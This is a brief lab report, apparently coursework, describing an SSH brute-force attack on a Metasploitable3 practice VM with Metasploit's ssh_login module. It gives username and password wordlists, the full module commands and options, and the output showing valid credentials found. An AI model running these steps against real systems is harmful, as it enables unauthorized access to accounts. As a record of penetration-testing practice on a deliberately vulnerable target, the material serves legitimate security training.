# Metasploit – SSH Brute-Force Attack

This section shows how we performed a **real brute-force attack** on the SSH service of Metasploitable3 using Metasploit.

---

## Target Info

- IP Address: 172.28.128.3
- Port: 22
- Service: SSH
- Goal: Discover valid credentials using brute-force.

---

## What We Did

We used Metasploit’s `ssh_login` scanner module to perform a brute-force attack. Instead of trying a single username/password, we created **wordlists** with multiple usernames and passwords. Metasploit automatically tried all combinations until it found valid login credentials.

---

## Wordlists Used

**users.txt**

```
admin
msfadmin
root
vagrant
test
```

**pass.txt**

```
password
123456
msfadmin
vagrant
admin123
```

---

## Steps

1. Start Metasploit:

```bash
msfconsole
```

2. Load the SSH login scanner module:

```bash
use auxiliary/scanner/ssh/ssh_login
```

3. Set up the target and wordlists:

```bash
set RHOSTS 172.28.128.3
set USER_FILE /home/kali/users.txt
set PASS_FILE /home/kali/pass.txt
set BRUTEFORCE_SPEED 5
set THREADS 4
set VERBOSE true
set STOP_ON_SUCCESS true
run
```

---

## Result

Metasploit tried multiple combinations and found valid credentials:

```
[+] 172.28.128.3:22 - Login Successful: vagrant:vagrant
```

This confirms the SSH service was vulnerable to brute-force attacks using weak credentials.

---

## Screenshot

A screenshot showing the brute-force attempts and the successful login result was captured.  
The file is saved as: `metasploit_attack.png`

---

This completes Task 1.1 for Phase 1.
